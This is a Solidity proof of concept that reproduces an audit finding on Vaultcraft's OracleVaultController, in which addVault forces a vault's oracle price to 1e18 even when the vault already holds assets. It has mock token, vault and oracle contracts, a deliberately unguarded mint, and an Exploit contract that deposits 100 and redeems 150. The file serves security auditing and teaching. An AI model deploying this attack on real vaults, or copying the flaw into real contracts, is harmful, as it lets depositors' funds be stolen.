// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Vaultcraft — OracleVaultController.addVault (Zokyo, 2024-12-31)
    addVault always writes price 1e18 and does not check that the vault is empty.
    A vault that already holds 2 assets per share is priced at 1. A later
    depositor mints twice the fair shares and redeems 50 of the existing assets.
*/

contract Asset {
    string public symbol = "AST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ERC4626 {
    Asset public assetToken;
    uint256 public totalAssets;
    uint256 public totalShares;
    mapping(address => uint256) public sharesOf;
    address public oracle;

    constructor(Asset asset_) {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function setOracle(address oracle_) external {
        oracle = oracle_;
    }

    function seed(address to, uint256 assets, uint256 shares) external {
        assetToken.mint(address(this), assets);
        totalAssets += assets;
        totalShares += shares;
        sharesOf[to] += shares;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        uint256 price = Oracle(oracle).prices(address(this));
        require(price != 0, "price");
        shares = assets * 1e18 / price; // STORY: mint at oracle price
        assetToken.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;
    }

    function redeem(uint256 shares) external returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares, "shares");
        assets = shares * totalAssets / totalShares; // STORY: redeem
        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;
        assetToken.transfer(msg.sender, assets);
    }
}

contract Oracle {
    mapping(address => uint256) public prices;

    function setPrice(address vault, address, uint256 price, uint256) external {
        prices[vault] = price;
    }
}

contract OracleVaultController {
    address public owner;
    Oracle public oracle;
    mapping(address => uint256) public highWaterMarks;

    constructor(Oracle oracle_) {
        owner = msg.sender;
        oracle = oracle_;
    }

    function addVault(address vault) external {
        require(msg.sender == owner, "owner");
        highWaterMarks[vault] = 1e18; // STORY: watermark
        oracle.setPrice(vault, address(ERC4626(vault).asset()), 1e18, 1e18); // @> VULN: price is forced to 1e18 even when the vault already holds assets
    }
}

contract Exploit {
    Asset public asset;
    ERC4626 public vault;
    Oracle public oracle;
    OracleVaultController public controller;
    uint256 public received;

    constructor() {
        asset = new Asset();
        vault = new ERC4626(asset);
        oracle = new Oracle();
        controller = new OracleVaultController(oracle);
        vault.setOracle(address(oracle));
        vault.seed(address(0xBEEF), 200e18, 100e18);
        asset.mint(address(this), 100e18);
    }

    function run() external {
        controller.addVault(address(vault)); // STORY: add
        uint256 shares = vault.deposit(100e18); // STORY: deposit
        require(shares == 100e18, "shares");
        received = vault.redeem(shares);
        require(oracle.prices(address(vault)) == 1e18, "price"); // STORY: price
        require(received == 150e18, "out"); // STORY: harm
        require(asset.balanceOf(address(this)) == 150e18, "bal");
    }
}
